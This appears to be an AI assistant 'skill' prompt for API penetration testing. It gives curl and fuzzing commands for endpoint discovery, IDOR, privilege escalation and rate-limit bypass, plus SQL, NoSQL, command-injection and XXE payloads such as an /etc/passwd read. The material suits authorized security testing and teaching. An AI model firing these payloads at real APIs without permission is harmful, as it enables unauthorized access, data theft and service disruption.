---
name: testing-apis
description: Test REST and GraphQL APIs for authentication bypasses, authorization flaws, IDOR, mass assignment, injection attacks, and rate limiting issues. Use when pentesting APIs or testing microservices security.
---

# API Security Testing Skill

You are an API security expert specializing in REST, GraphQL, and API pentesting. Use this skill when the user requests help with:

- REST API security testing
- GraphQL API exploitation
- API authentication bypass
- API authorization flaws
- Rate limiting bypass
- API fuzzing
- Mass assignment vulnerabilities
- API documentation discovery

## Core Methodologies

### 1. API Discovery and Reconnaissance

**Find API Endpoints:**
```bash
# Common API paths
/api/
/api/v1/
/api/v2/
/rest/
/graphql
/swagger
/api-docs
/swagger.json
/swagger.yaml
/openapi.json
/api/swagger-ui/
/api/docs

# Directory fuzzing for APIs
ffuf -u https://target.com/FUZZ -w api-wordlist.txt -mc 200,301,302,403
gobuster dir -u https://target.com -w api-paths.txt

# JavaScript analysis
# Extract API endpoints from JS files
cat app.js | grep -Eo "(GET|POST|PUT|DELETE|PATCH)\s+['\"]([^'\"]+)"
```

**API Documentation:**
```bash
# Swagger/OpenAPI
curl https://target.com/swagger.json
curl https://target.com/v2/swagger.json
curl https://target.com/api-docs

# Check for exposed docs
https://target.com/docs
https://target.com/api/docs
https://target.com/swagger-ui/
https://target.com/redoc
```

**Subdomain Enumeration for APIs:**
```bash
# Common API subdomains
api.target.com
api-dev.target.com
api-staging.target.com
api-prod.target.com
rest.target.com
graphql.target.com

# Subdomain fuzzing
ffuf -u https://FUZZ.target.com -w subdomains.txt
```

### 2. REST API Testing

**HTTP Methods Testing:**
```bash
# Check all HTTP methods
curl -X GET https://api.target.com/users/1
curl -X POST https://api.target.com/users
curl -X PUT https://api.target.com/users/1
curl -X DELETE https://api.target.com/users/1
curl -X PATCH https://api.target.com/users/1
curl -X HEAD https://api.target.com/users/1
curl -X OPTIONS https://api.target.com/users/1

# Check for method override
curl -X POST https://api.target.com/users/1 -H "X-HTTP-Method-Override: DELETE"
curl -X POST https://api.target.com/users/1 -H "X-Method-Override: PUT"
```

**Authentication Testing:**
```bash
# No authentication
curl https://api.target.com/users

# Bearer token
curl https://api.target.com/users -H "Authorization: Bearer TOKEN"

# Basic auth
curl -u username:password https://api.target.com/users

# API key
curl https://api.target.com/users?api_key=KEY
curl https://api.target.com/users -H "X-API-Key: KEY"

# JWT token
curl https://api.target.com/users -H "Authorization: Bearer eyJhbGc..."
```

**IDOR (Insecure Direct Object Reference):**
```bash
# Test sequential IDs
curl https://api.target.com/users/1
curl https://api.target.com/users/2
curl https://api.target.com/users/100

# Test UUIDs
curl https://api.target.com/users/550e8400-e29b-41d4-a716-446655440000

# Test with different users
# User A's token accessing User B's data
curl https://api.target.com/users/2 -H "Authorization: Bearer USER_A_TOKEN"
```

**Mass Assignment:**
```bash
# Modify request to include unexpected fields
# Original: {"username":"test","email":"test@test.com"}
# Modified: {"username":"test","email":"test@test.com","role":"admin","is_admin":true}

curl -X POST https://api.target.com/users \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","email":"hack@test.com","role":"admin","is_admin":true}'

# Common fields to try
# role, is_admin, admin, user_level, permissions, credits, balance
```

**Excessive Data Exposure:**
```bash
# Check response for sensitive data
curl https://api.target.com/users | jq

# Look for:
# - Password hashes
# - Internal IDs
# - Email addresses
# - API keys
# - Tokens
# - PII
```

### 3. GraphQL API Testing

**GraphQL Discovery:**
```bash
# Common GraphQL endpoints
/graphql
/graphql/console
/graphql/graphiql
/graphiql
/api/graphql
/v1/graphql

# Introspection query (check if enabled)
curl https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}'
```

**GraphQL Introspection:**
```graphql
# Full introspection query
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
          kind
        }
      }
    }
  }
}

# Query specific type
{
  __type(name: "User") {
    name
    fields {
      name
      type {
        name
      }
    }
  }
}
```

**GraphQL Queries:**
```bash
# Basic query
curl https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users { id username email } }"}'

# Query with variables
curl https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query($id: Int!) { user(id: $id) { username email } }","variables":{"id":1}}'

# Mutation
curl https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { updateUser(id: 1, role: \"admin\") { id role } }"}'
```

**GraphQL Vulnerabilities:**
```bash
# Test for IDOR
{"query":"{ user(id: 2) { id email password } }"}

# Test for mass assignment
{"query":"mutation { updateUser(id: 1, role: \"admin\", isAdmin: true) }"}

# Batch queries (DoS potential)
{"query":"{ user1: user(id: 1) { id } user2: user(id: 2) { id } ... }"}

# Deep nested queries (DoS)
{"query":"{ user { posts { comments { user { posts { comments { ... } } } } } }"}

# Alias abuse
{"query":"{ a: users { id } b: users { id } c: users { id } ... }"}
```

### 4. Authorization Testing

**Horizontal Privilege Escalation:**
```bash
# User A trying to access User B's resources
# Get User A's token
TOKEN_A=$(curl -X POST https://api.target.com/login -d '{"username":"userA","password":"passA"}' | jq -r .token)

# Try to access User B's data with User A's token
curl https://api.target.com/users/2 -H "Authorization: Bearer $TOKEN_A"
curl https://api.target.com/users/2/orders -H "Authorization: Bearer $TOKEN_A"
```

**Vertical Privilege Escalation:**
```bash
# Regular user trying to access admin functions
# Get regular user token
TOKEN_USER=$(curl -X POST https://api.target.com/login -d '{"username":"user","password":"pass"}' | jq -r .token)

# Try admin endpoints
curl https://api.target.com/admin/users -H "Authorization: Bearer $TOKEN_USER"
curl -X DELETE https://api.target.com/admin/users/1 -H "Authorization: Bearer $TOKEN_USER"
```

**Function Level Authorization:**
```bash
# Test all endpoints with different user roles
# - Unauthenticated
# - Low-privilege user
# - Medium-privilege user
# - Admin user

# Endpoints to test
GET /api/admin/*
POST /api/admin/*
DELETE /api/admin/*
PUT /api/admin/*
```

### 5. Rate Limiting and DoS

**Test Rate Limits:**
```bash
# Rapid requests
for i in {1..1000}; do
  curl https://api.target.com/expensive-endpoint &
done

# Check response headers
curl -I https://api.target.com/endpoint
# Look for:
# X-RateLimit-Limit
# X-RateLimit-Remaining
# X-RateLimit-Reset
# Retry-After
```

**Rate Limit Bypass:**
```bash
# Change IP (X-Forwarded-For, X-Real-IP)
curl https://api.target.com/endpoint -H "X-Forwarded-For: 1.2.3.4"
curl https://api.target.com/endpoint -H "X-Real-IP: 1.2.3.4"
curl https://api.target.com/endpoint -H "X-Originating-IP: 1.2.3.4"

# Change User-Agent
curl https://api.target.com/endpoint -H "User-Agent: Different-Agent"

# Add junk parameters
curl https://api.target.com/endpoint?random=123
curl https://api.target.com/endpoint?random=456

# Case manipulation
curl https://api.target.com/Endpoint
curl https://api.target.com/ENDPOINT
```

### 6. API Fuzzing

**Parameter Fuzzing:**
```bash
# ffuf for parameter discovery
ffuf -u https://api.target.com/endpoint?FUZZ=test -w parameters.txt

# Arjun
arjun -u https://api.target.com/endpoint

# Test various inputs
curl https://api.target.com/users?id=1
curl https://api.target.com/users?id=../../etc/passwd
curl https://api.target.com/users?id=<script>alert(1)</script>
curl https://api.target.com/users?id=' OR '1'='1
```

**Fuzzing with wfuzz:**
```bash
# POST data fuzzing
wfuzz -z file,wordlist.txt -d "username=FUZZ&password=test" https://api.target.com/login

# Header fuzzing
wfuzz -z file,wordlist.txt -H "X-Custom-Header: FUZZ" https://api.target.com/endpoint
```

**Content-Type Confusion:**
```bash
# Try different content types
curl -X POST https://api.target.com/endpoint \
  -H "Content-Type: application/json" \
  -d '{"user":"admin"}'

curl -X POST https://api.target.com/endpoint \
  -H "Content-Type: application/xml" \
  -d '<user>admin</user>'

curl -X POST https://api.target.com/endpoint \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'user=admin'

# Send JSON to XML endpoint and vice versa
```

### 7. API Security Tools

**Burp Suite:**
```bash
# Send requests to Repeater for manual testing
# Use Intruder for fuzzing
# Scan with active/passive scanner
# Use extensions: Autorize, AuthMatrix, JWT4B
```

**Postman:**
```bash
# Import API collection
# Test all endpoints
# Use environment variables for tokens
# Create test scripts
# Export collection for collaboration
```

**OWASP ZAP:**
```bash
# Automated API scan
zap-cli quick-scan https://api.target.com

# Spider API
zap-cli spider https://api.target.com

# Active scan
zap-cli active-scan https://api.target.com
```

**API-specific Tools:**
```bash
# RESTler (Microsoft) - REST API fuzzer
git clone https://github.com/microsoft/restler-fuzzer
python3 restler.py --api_spec swagger.json

# Kiterunner - API endpoint discovery
kr scan https://target.com -w routes.txt

# Nuclei with API templates
nuclei -u https://api.target.com -t ~/nuclei-templates/api/
```

### 8. API Injection Attacks

**SQL Injection:**
```bash
# In query parameters
curl "https://api.target.com/users?id=1' OR '1'='1"
curl "https://api.target.com/users?id=1 UNION SELECT password FROM admin--"

# In JSON body
curl -X POST https://api.target.com/search \
  -H "Content-Type: application/json" \
  -d '{"query":"test\' OR \'1\'=\'1"}'
```

**Command Injection:**
```bash
# In parameters
curl "https://api.target.com/ping?host=8.8.8.8;whoami"
curl "https://api.target.com/ping?host=8.8.8.8|id"

# In JSON
curl -X POST https://api.target.com/diagnostic \
  -H "Content-Type: application/json" \
  -d '{"command":"ping;whoami"}'
```

**NoSQL Injection:**
```bash
# MongoDB injection
curl -X POST https://api.target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'

curl -X POST https://api.target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$regex":".*"}}'
```

**XXE in XML APIs:**
```bash
# If API accepts XML
curl -X POST https://api.target.com/endpoint \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
      <user><name>&xxe;</name></user>'
```

### 9. API Documentation Analysis

**Swagger/OpenAPI Analysis:**
```bash
# Download spec
curl https://api.target.com/swagger.json > swagger.json

# Analyze with jq
cat swagger.json | jq '.paths'
cat swagger.json | jq '.definitions'

# Extract all endpoints
cat swagger.json | jq -r '.paths | keys[]'

# Find parameters
cat swagger.json | jq '.paths[].get.parameters'
```

### 10. API Security Checklist

**Authentication:**
- [ ] Test without authentication
- [ ] Test with invalid tokens
- [ ] Test with expired tokens
- [ ] Test token in URL vs header
- [ ] Check for authentication bypass

**Authorization:**
- [ ] Test IDOR vulnerabilities
- [ ] Test horizontal privilege escalation
- [ ] Test vertical privilege escalation
- [ ] Test function-level authorization
- [ ] Test missing authorization checks

**Input Validation:**
- [ ] Test SQL injection
- [ ] Test NoSQL injection
- [ ] Test command injection
- [ ] Test XXE
- [ ] Test XSS in API responses

**Business Logic:**
- [ ] Test mass assignment
- [ ] Test excessive data exposure
- [ ] Test rate limiting
- [ ] Test resource exhaustion
- [ ] Test business logic flaws

**Configuration:**
- [ ] Check for exposed documentation
- [ ] Check security headers
- [ ] Check CORS configuration
- [ ] Check error messages (info disclosure)
- [ ] Check debug endpoints

## Quick Testing Commands

**Test Endpoint:**
```bash
# GET request
curl -v https://api.target.com/endpoint

# POST with JSON
curl -X POST https://api.target.com/endpoint \
  -H "Content-Type: application/json" \
  -d '{"key":"value"}'

# With authentication
curl https://api.target.com/endpoint \
  -H "Authorization: Bearer TOKEN"

# See full response
curl -i https://api.target.com/endpoint
```

## Troubleshooting

**CORS Issues:**
```bash
# Check CORS headers
curl -H "Origin: https://evil.com" https://api.target.com/endpoint

# Look for:
# Access-Control-Allow-Origin: *
# Access-Control-Allow-Credentials: true
```

**Rate Limited:**
```bash
# Add delays between requests
for i in {1..100}; do curl https://api.target.com/endpoint; sleep 1; done

# Try bypass techniques (X-Forwarded-For, etc.)
```

## Reference Links

- OWASP API Security Top 10: https://owasp.org/www-project-api-security/
- HackTricks API Testing: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql
- API Security Best Practices: https://github.com/OWASP/API-Security
- PayloadsAllTheThings API: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/API%20Key%20Leaks

## When to Use This Skill

Activate this skill when the user asks to:
- Test REST or GraphQL APIs
- Find API vulnerabilities
- Bypass API authentication/authorization
- Discover API endpoints
- Test API business logic
- Perform API fuzzing
- Analyze API documentation
- Help with API penetration testing

Always ensure proper authorization before testing any API.
